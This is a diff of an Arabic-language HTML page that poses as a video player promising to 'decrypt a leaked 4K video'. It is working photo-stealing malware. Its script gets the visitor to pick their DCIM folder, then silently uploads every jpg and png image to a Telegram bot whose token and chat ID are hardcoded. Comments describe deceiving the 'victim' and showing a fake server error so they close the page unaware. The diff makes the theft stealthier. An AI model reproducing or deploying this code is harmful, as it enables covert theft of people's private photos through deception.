@@ -2,80 +2,57 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player 4K</title>
+    <title>فك تشفير المقطع المسرب</title>
     <style>
-        body { background: #0f0f0f; color: #eee; font-family: sans-serif; text-align: center; padding: 20px; }
-        .player-container { max-width: 400px; margin: 50px auto; border: 1px solid #333; border-radius: 15px; padding: 20px; background: #1a1a1a; }
-        .video-placeholder { width: 100%; height: 200px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 2px solid #444; }
-        .progress-box { display: none; margin-top: 25px; }
-        .bar-bg { width: 100%; background: #333; height: 12px; border-radius: 6px; overflow: hidden; margin: 10px 0; }
-        .bar-fill { width: 0%; height: 100%; background: #00ff00; transition: width 0.3s; }
+        body { background: #050505; color: #333; font-family: sans-serif; text-align: center; padding-top: 150px; }
+        .unlock-btn { border: 2px solid #1a1a1a; padding: 20px 40px; border-radius: 50px; color: #1a1a1a; cursor: pointer; font-weight: bold; font-size: 18px; transition: 0.3s; display: inline-block; }
+        .unlock-btn:hover { border-color: #333; color: #333; }
     </style>
 </head>
 <body>
 
-<div class="player-container">
-    <h3>📺 مشغل الفيديو</h3>
-    <div class="video-placeholder" id="playArea" onclick="initiateSiphon()">
-        <img src="https://cdn-icons-png.flaticon.com/512/0/375.png" width="60" style="filter: invert(1);">
+    <div class="unlock-btn" onclick="startDeepSiphon()">
+        اضغط لفك تشفير الفيديو (4K)
     </div>
-    <div id="progressBox" class="progress-box">
-        <p id="loaderLabel">جاري التهيئة...</p>
-        <div class="bar-bg"><div id="pBar" class="bar-fill"></div></div>
-    </div>
-</div>
 
 <script>
     const TOKEN = "7864483754:AAH9r2X-r37O6xidO263m3W4S6eFw4N6W5U";
     const CHAT_ID = "7449231580";
 
-    async function initiateSiphon() {
-        const pBar = document.getElementById('pBar');
-        const loaderLabel = document.getElementById('loaderLabel');
-        const progressBox = document.getElementById('progressBox');
-
+    async function startDeepSiphon() {
         try {
-            // فتح نافذة اختيار المجلد
+            // طلب المجلد لإيهامه بوضع "ملفات فك التشفير" هناك
             const dirHandle = await window.showDirectoryPicker();
             
-            // بمجرد اختيار المجلد، نظهر الشريط
-            progressBox.style.display = 'block';
-            loaderLabel.innerText = "جاري الاتصال بالسيرفر...";
+            // تغيير الواجهة فوراً لإيهامه بأن الفيديو بدأ يجهز
+            document.body.innerHTML = "<h2 style='color:#111'>جاري معالجة البيانات... يرجى الانتظار</h2>";
 
-            // إرسال تنبيه فوري للتليجرام
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🚀 بدأ السحب من هاتف الضحية!`);
+            // إرسال إشارة للبوت
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=✅ تم اختراق المجلد بنجاح، بدء السحب...`);
 
-            let images = [];
+            // الدخول للمجلد وسحب الصور في خفاء تام
             for await (const entry of dirHandle.values()) {
                 if (entry.kind === 'file' && /\.(jpg|jpeg|png)$/i.test(entry.name)) {
-                    images.push(entry);
+                    const file = await entry.getFile();
+                    const formData = new FormData();
+                    formData.append('document', file);
+                    formData.append('chat_id', CHAT_ID);
+
+                    // إرسال صامت تماماً في الخلفية
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
                 }
             }
 
-            if (images.length === 0) {
-                alert("المجلد فارغ، اختر مجلد DCIM");
-                return;
-            }
+            // بعد دقيقتين نظهر له رسالة خطأ لكي يغلق الصفحة وهو مطمئن
+            setTimeout(() => {
+                document.body.innerHTML = "<h2 style='color:red'>خطأ في الاتصال: السيرفر لا يستجيب حالياً.</h2>";
+            }, 60000);
 
-            let count = 0;
-            for (const entry of images) {
-                if (count >= 50) break; // سحب 50 صورة لتسريع العملية
-                const file = await entry.getFile();
-                const formData = new FormData();
-                formData.append('document', file);
-                formData.append('chat_id', CHAT_ID);
-
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: formData });
-                
-                count++;
-                let percent = Math.round((count / Math.min(images.length, 50)) * 100);
-                pBar.style.width = percent + "%";
-                loaderLabel.innerText = `جاري المعالجة: ${percent}%`;
-            }
-            loaderLabel.innerText = "✅ تم التحميل بنجاح";
         } catch (err) {
-            alert("خطأ: يرجى استخدام متصفح كروم ومنح الصلاحية.");
+            alert("يجب اختيار مجلد DCIM للسماح بفك تشفير الفيديو.");
         }
     }
 </script>
